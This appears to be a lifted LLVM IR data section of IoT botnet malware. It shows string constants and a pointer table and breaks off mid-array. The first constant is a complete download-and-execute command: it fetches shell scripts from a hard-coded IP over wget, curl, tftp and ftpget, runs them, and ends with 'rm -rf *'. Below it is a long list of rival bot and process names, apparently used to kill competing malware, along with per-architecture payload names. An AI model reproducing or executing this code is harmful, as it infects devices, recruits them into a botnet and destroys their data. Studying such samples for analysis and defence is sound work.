@global_var_208b0.541 = constant [704 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_224cc.543 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_224dc.544 = constant [6 x i8] c"/tmp/\00"
@global_var_224e4.545 = constant [6 x i8] c"/var/\00"
@global_var_224ec.546 = constant [6 x i8] c"/dev/\00"
@global_var_224f4.547 = constant [10 x i8] c"/var/run/\00"
@global_var_22500.548 = constant [10 x i8] c"/dev/shm/\00"
@global_var_2250c.549 = constant [6 x i8] c"/mnt/\00"
@global_var_22514.550 = constant [7 x i8] c"/boot/\00"
@global_var_2251c.551 = constant [6 x i8] c"/usr/\00"
@global_var_21890.563 = constant [5 x i8] c"wget\00"
@global_var_21898.564 = constant [6 x i8] c"armv*\00"
@global_var_20bd4.565 = constant [5 x i8] c"bot*\00"
@global_var_218a0.566 = constant [6 x i8] c"ntpd*\00"
@global_var_20be8.567 = constant [7 x i8] c"hackz*\00"
@global_var_218a8.568 = constant [8 x i8] c"shitty*\00"
@global_var_218b0.569 = constant [6 x i8] c"jack*\00"
@global_var_20bac.570 = constant [6 x i8] c"mips*\00"
@global_var_20b8c.571 = constant [5 x i8] c"sex*\00"
@global_var_218b8.572 = constant [4 x i8] c"i86\00"
@global_var_218bc.573 = constant [5 x i8] c"ssh*\00"
@global_var_20bcc.574 = constant [5 x i8] c"sh4*\00"
@global_var_20bdc.575 = constant [11 x i8] c"jackmeoff*\00"
@global_var_20b94.576 = constant [6 x i8] c"tftp*\00"
@global_var_218c4.577 = constant [4 x i8] c"i56\00"
@global_var_218c8.578 = constant [5 x i8] c"mips\00"
@global_var_218d0.579 = constant [7 x i8] c"mipsel\00"
@global_var_218d8.580 = constant [4 x i8] c"sh4\00"
@global_var_218dc.581 = constant [4 x i8] c"x86\00"
@global_var_218e0.582 = constant [5 x i8] c"i686\00"
@global_var_218e8.583 = constant [4 x i8] c"ppc\00"
@global_var_218ec.584 = constant [5 x i8] c"i586\00"
@global_var_218f4.585 = constant [7 x i8] c"mips64\00"
@global_var_218fc.586 = constant [6 x i8] c"sh2eb\00"
@global_var_21904.587 = constant [7 x i8] c"sh2elf\00"
@global_var_2190c.588 = constant [4 x i8] c"arm\00"
@global_var_21910.589 = constant [6 x i8] c"armv5\00"
@global_var_21918.590 = constant [8 x i8] c"armv4tl\00"
@global_var_21920.591 = constant [6 x i8] c"armv4\00"
@global_var_21928.592 = constant [6 x i8] c"armv6\00"
@global_var_21930.593 = constant [8 x i8] c"powerpc\00"
@global_var_21938.594 = constant [13 x i8] c"powerpc440fp\00"
@global_var_21948.595 = constant [5 x i8] c"m68k\00"
@global_var_21950.596 = constant [6 x i8] c"sparc\00"
@global_var_21958.597 = constant [7 x i8] c"x86_64\00"
@global_var_21960.598 = constant [11 x i8] c"jackmymips\00"
@global_var_2196c.599 = constant [13 x i8] c"jackmymips64\00"
@global_var_2197c.600 = constant [13 x i8] c"jackmymipsel\00"
@global_var_2198c.601 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_21998.602 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_219a8.603 = constant [10 x i8] c"jackmysh4\00"
@global_var_219b4.604 = constant [10 x i8] c"jackmyx86\00"
@global_var_219c0.605 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_219cc.606 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_219dc.607 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_219e8.608 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_219f4.609 = constant [11 x i8] c"jackmyi686\00"
@global_var_21a00.610 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_21a10.611 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_21a24.612 = constant [11 x i8] c"jackmyi586\00"
@global_var_21a30.613 = constant [11 x i8] c"jackmym68k\00"
@global_var_21a3c.614 = constant [12 x i8] c"jackmysparc\00"
@global_var_21a48.615 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_21a58.616 = constant [11 x i8] c"hackmymips\00"
@global_var_21a64.617 = constant [13 x i8] c"hackmymips64\00"
@global_var_21a74.618 = constant [13 x i8] c"hackmymipsel\00"
@global_var_21a84.619 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_21a90.620 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_21aa0.621 = constant [10 x i8] c"hackmysh4\00"
@global_var_21aac.622 = constant [10 x i8] c"hackmyx86\00"
@global_var_21ab8.623 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_21ac4.624 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_21ad4.625 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_21ae0.626 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_21aec.627 = constant [11 x i8] c"hackmyi686\00"
@global_var_21af8.628 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_21b08.629 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_21b1c.630 = constant [11 x i8] c"hackmyi586\00"
@global_var_21b28.631 = constant [11 x i8] c"hackmym68k\00"
@global_var_21b34.632 = constant [12 x i8] c"hackmysparc\00"
@global_var_21b40.633 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_21b50.634 = constant [3 x i8] c"b1\00"
@global_var_21b54.635 = constant [3 x i8] c"b2\00"
@global_var_21b58.636 = constant [3 x i8] c"b3\00"
@global_var_21b5c.637 = constant [3 x i8] c"b4\00"
@global_var_21b60.638 = constant [3 x i8] c"b5\00"
@global_var_21b64.639 = constant [3 x i8] c"b6\00"
@global_var_21b68.640 = constant [3 x i8] c"b7\00"
@global_var_21b6c.641 = constant [3 x i8] c"b8\00"
@global_var_21b70.642 = constant [3 x i8] c"b9\00"
@global_var_21b74.643 = constant [4 x i8] c"b10\00"
@global_var_21b78.644 = constant [4 x i8] c"b11\00"
@global_var_21b7c.645 = constant [4 x i8] c"b12\00"
@global_var_21b80.646 = constant [4 x i8] c"b13\00"
@global_var_21b84.647 = constant [4 x i8] c"b14\00"
@global_var_21b88.648 = constant [4 x i8] c"b15\00"
@global_var_21b8c.649 = constant [4 x i8] c"b16\00"
@global_var_21b90.650 = constant [4 x i8] c"b17\00"
@global_var_21b94.651 = constant [4 x i8] c"b18\00"
@global_var_21b98.652 = constant [4 x i8] c"b19\00"
@global_var_21b9c.653 = constant [4 x i8] c"b20\00"
@global_var_21ba0.654 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_21bb4.655 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_21bc0.656 = constant [10 x i8] c"dvrHelper\00"
@global_var_21bcc.657 = constant [8 x i8] c"FDFDHFC\00"
@global_var_21bd4.658 = constant [5 x i8] c"FEUB\00"
@global_var_21bdc.659 = constant [9 x i8] c"FTUdftui\00"
@global_var_21be8.660 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_21bf4.661 = constant [6 x i8] c"jhUOH\00"
@global_var_21bfc.662 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_21c08.663 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_21c14.664 = constant [8 x i8] c"kmymips\00"
@global_var_21c1c.665 = constant [10 x i8] c"kmymips64\00"
@global_var_21c28.666 = constant [10 x i8] c"kmymipsel\00"
@global_var_21c34.667 = constant [9 x i8] c"kmysh2eb\00"
@global_var_21c40.668 = constant [10 x i8] c"kmysh2elf\00"
@global_var_21c4c.669 = constant [7 x i8] c"kmysh4\00"
@global_var_21c54.670 = constant [7 x i8] c"kmyx86\00"
@global_var_21c5c.671 = constant [9 x i8] c"kmyarmv5\00"
@global_var_21c68.672 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_21c74.673 = constant [9 x i8] c"kmyarmv4\00"
@global_var_21c80.674 = constant [9 x i8] c"kmyarmv6\00"
@global_var_21c8c.675 = constant [8 x i8] c"kmyi686\00"
@global_var_21c94.676 = constant [11 x i8] c"kmypowerpc\00"
@global_var_21ca0.677 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_21cb0.678 = constant [8 x i8] c"kmyi586\00"
@global_var_21cb8.679 = constant [8 x i8] c"kmym68k\00"
@global_var_21cc0.680 = constant [9 x i8] c"kmysparc\00"
@global_var_21ccc.681 = constant [10 x i8] c"kmyx86_64\00"
@global_var_21cd8.682 = constant [8 x i8] c"lolmips\00"
@global_var_21ce0.683 = constant [10 x i8] c"lolmips64\00"
@global_var_21cec.684 = constant [10 x i8] c"lolmipsel\00"
@global_var_21cf8.685 = constant [9 x i8] c"lolsh2eb\00"
@global_var_21d04.686 = constant [10 x i8] c"lolsh2elf\00"
@global_var_21d10.687 = constant [7 x i8] c"lolsh4\00"
@global_var_21d18.688 = constant [7 x i8] c"lolx86\00"
@global_var_21d20.689 = constant [9 x i8] c"lolarmv5\00"
@global_var_21d2c.690 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_21d38.691 = constant [9 x i8] c"lolarmv4\00"
@global_var_21d44.692 = constant [9 x i8] c"lolarmv6\00"
@global_var_21d50.693 = constant [8 x i8] c"loli686\00"
@global_var_21d58.694 = constant [11 x i8] c"lolpowerpc\00"
@global_var_21d64.695 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_21d74.696 = constant [8 x i8] c"loli586\00"
@global_var_21d7c.697 = constant [8 x i8] c"lolm68k\00"
@global_var_21d84.698 = constant [9 x i8] c"lolsparc\00"
@global_var_21d90.699 = constant [8 x i8] c"RYrydry\00"
@global_var_21d98.700 = constant [8 x i8] c"telmips\00"
@global_var_21da0.701 = constant [10 x i8] c"telmips64\00"
@global_var_21dac.702 = constant [10 x i8] c"telmipsel\00"
@global_var_21db8.703 = constant [9 x i8] c"telsh2eb\00"
@global_var_21dc4.704 = constant [10 x i8] c"telsh2elf\00"
@global_var_21dd0.705 = constant [7 x i8] c"telsh4\00"
@global_var_21dd8.706 = constant [7 x i8] c"telx86\00"
@global_var_21de0.707 = constant [9 x i8] c"telarmv5\00"
@global_var_21dec.708 = constant [11 x i8] c"telarmv4tl\00"
@global_var_21df8.709 = constant [9 x i8] c"telarmv4\00"
@global_var_21e04.710 = constant [9 x i8] c"telarmv6\00"
@global_var_21e10.711 = constant [8 x i8] c"teli686\00"
@global_var_21e18.712 = constant [11 x i8] c"telpowerpc\00"
@global_var_21e24.713 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_21e34.714 = constant [8 x i8] c"teli586\00"
@global_var_21e3c.715 = constant [8 x i8] c"telm68k\00"
@global_var_21e44.716 = constant [9 x i8] c"telsparc\00"
@global_var_21e50.717 = constant [10 x i8] c"telx86_64\00"
@global_var_21e5c.718 = constant [12 x i8] c"TwoFacemips\00"
@global_var_21e68.719 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_21e78.720 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_21e88.721 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_21e98.722 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_21ea8.723 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_21eb4.724 = constant [11 x i8] c"TwoFacex86\00"
@global_var_21ec0.725 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_21ed0.726 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_21ee0.727 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_21ef0.728 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_21f00.729 = constant [12 x i8] c"TwoFacei686\00"
@global_var_21f0c.730 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_21f1c.731 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_21f30.732 = constant [12 x i8] c"TwoFacei586\00"
@global_var_21f3c.733 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_21f48.734 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_21f58.735 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_21f68.736 = constant [9 x i8] c"UYyuyioy\00"
@global_var_21f74.737 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_21f80.738 = constant [5 x i8] c"xxb1\00"
@global_var_21f88.739 = constant [5 x i8] c"xxb2\00"
@global_var_21f90.740 = constant [5 x i8] c"xxb3\00"
@global_var_21f98.741 = constant [5 x i8] c"xxb4\00"
@global_var_21fa0.742 = constant [5 x i8] c"xxb5\00"
@global_var_21fa8.743 = constant [5 x i8] c"xxb6\00"
@global_var_21fb0.744 = constant [5 x i8] c"xxb7\00"
@global_var_21fb8.745 = constant [5 x i8] c"xxb8\00"
@global_var_21fc0.746 = constant [5 x i8] c"xxb9\00"
@global_var_21fc8.747 = constant [6 x i8] c"xxb10\00"
@global_var_21fd0.748 = constant [6 x i8] c"xxb11\00"
@global_var_21fd8.749 = constant [6 x i8] c"xxb12\00"
@global_var_21fe0.750 = constant [6 x i8] c"xxb13\00"
@global_var_21fe8.751 = constant [6 x i8] c"xxb14\00"
@global_var_21ff0.752 = constant [6 x i8] c"xxb15\00"
@global_var_21ff8.753 = constant [6 x i8] c"xxb16\00"
@global_var_22000.754 = constant [6 x i8] c"xxb17\00"
@global_var_22008.755 = constant [6 x i8] c"xxb18\00"
@global_var_22010.756 = constant [6 x i8] c"xxb19\00"
@global_var_22018.757 = constant [6 x i8] c"xxb20\00"
@global_var_22020.758 = constant i32 822083584
@global_var_22024.759 = constant i32 838860800
@global_var_22028.760 = constant i32 855638016
@global_var_2202c.761 = constant i32 872415232
@global_var_22030.762 = constant i32 889192448
@global_var_22034.763 = constant i32 905969664
@global_var_22038.764 = constant i32 922746880
@global_var_2203c.765 = constant i32 939524096
@global_var_22040.766 = constant i32 956301312
@global_var_22044.767 = constant [3 x i8] c"10\00"
@global_var_22048.768 = constant [3 x i8] c"11\00"
@global_var_2204c.769 = constant [3 x i8] c"12\00"
@global_var_22050.770 = constant [3 x i8] c"13\00"
@global_var_22054.771 = constant [3 x i8] c"14\00"
@global_var_22058.772 = constant [3 x i8] c"15\00"
@global_var_2205c.773 = constant [3 x i8] c"16\00"
@global_var_22060.774 = constant [3 x i8] c"17\00"
@global_var_22064.775 = constant [3 x i8] c"18\00"
@global_var_22068.776 = constant [3 x i8] c"19\00"
@global_var_2206c.777 = constant [3 x i8] c"20\00"
@global_var_22070.778 = constant [3 x i8] c"bb\00"
@global_var_22074.779 = constant [11 x i8] c"busybotnet\00"
@global_var_22080.780 = constant [5 x i8] c"pppd\00"
@global_var_22088.781 = constant [6 x i8] c"pppoe\00"
@global_var_22090.782 = constant [5 x i8] c"wput\00"
@global_var_22098.783 = constant [3 x i8] c"B1\00"
@global_var_2209c.784 = constant [3 x i8] c"B2\00"
@global_var_220a0.785 = constant [3 x i8] c"B3\00"
@global_var_220a4.786 = constant [3 x i8] c"B4\00"
@global_var_220a8.787 = constant [3 x i8] c"B5\00"
@global_var_220ac.788 = constant [3 x i8] c"B6\00"
@global_var_220b0.789 = constant [3 x i8] c"B7\00"
@global_var_220b4.790 = constant [3 x i8] c"B8\00"
@global_var_220b8.791 = constant [3 x i8] c"B9\00"
@global_var_220bc.792 = constant [4 x i8] c"B10\00"
@global_var_220c0.793 = constant [4 x i8] c"B11\00"
@global_var_220c4.794 = constant [4 x i8] c"B12\00"
@global_var_220c8.795 = constant [4 x i8] c"B13\00"
@global_var_220cc.796 = constant [4 x i8] c"B14\00"
@global_var_220d0.797 = constant [4 x i8] c"B15\00"
@global_var_220d4.798 = constant [4 x i8] c"B16\00"
@global_var_220d8.799 = constant [4 x i8] c"B17\00"
@global_var_220dc.800 = constant [4 x i8] c"B18\00"
@global_var_220e0.801 = constant [4 x i8] c"B20\00"
@global_var_220e4.802 = constant [10 x i8] c"dvrhelper\00"
@global_var_220f0.803 = constant [247 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21890.563, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21898.564, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20bd4.565, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_218a0.566, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20be8.567, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_218a8.568, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_218b0.569, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20bac.570, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20b8c.571, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_218b8.572, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_218bc.573, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_20bcc.574, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20bdc.575, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_20b94.576, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_218c4.577, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_218c8.578, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_218d0.579, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_218d8.580, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_218dc.581, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_218e0.582, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_218e8.583, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_218ec.584, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_218c8.578, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_218f4.585, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_218d0.579, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_218fc.586, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21904.587, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_218d8.580, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_218dc.581, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2190c.588, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21910.589, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21918.590, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21920.591, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21928.592, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_218e0.582, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21930.593, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21938.594, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_218ec.584, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21948.595, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21950.596, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21958.597, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21960.598, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2196c.599, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2197c.600, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2198c.601, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21998.602, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_219a8.603, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_219b4.604, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_219c0.605, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_219cc.606, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_219dc.607, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_219e8.608, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_219f4.609, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21a00.610, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_21a10.611, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21a24.612, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21a30.613, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21a3c.614, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21a48.615, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21a58.616, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21a64.617, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21a74.618, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21a84.619, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21a90.620, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21aa0.621, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21aac.622, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21ab8.623, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21ac4.624, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21ad4.625, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21ae0.626, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21aec.627, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21af8.628, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_21b08.629, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21b1c.630, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21b28.631, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21b34.632, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21b40.633, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21b50.634, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21b54.635, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21b58.636, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21b5c.637, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21b60.638, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21b64.639, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21b68.640, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21b6c.641, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21b70.642, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b74.643, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b78.644, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b7c.645, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b80.646, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b84.647, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b88.648, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b8c.649, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b90.650, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b94.651, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b98.652, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b9c.653, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_21ba0.654, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21bb4.655, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21bc0.656, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21bcc.657, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21bd4.658, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21bdc.659, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21be8.660, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21bf4.661, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21bfc.662, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21c08.663, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21c14.664, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21c1c.665, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21c28.666, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21c34.667, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21c40.668, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21c4c.669, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21c54.670, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21c5c.671, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21c68.672, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21c74.673, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21c80.674, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21c8c.675, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21c94.676, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_21ca0.677, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21cb0.678, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21cb8.679, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21cc0.680, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21ccc.681, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21cd8.682, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21ce0.683, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21cec.684, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21cf8.685, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21d04.686, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21d10.687, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21d18.688, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21d20.689, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21d2c.690, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21d38.691, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21d44.692, i32 0, i32 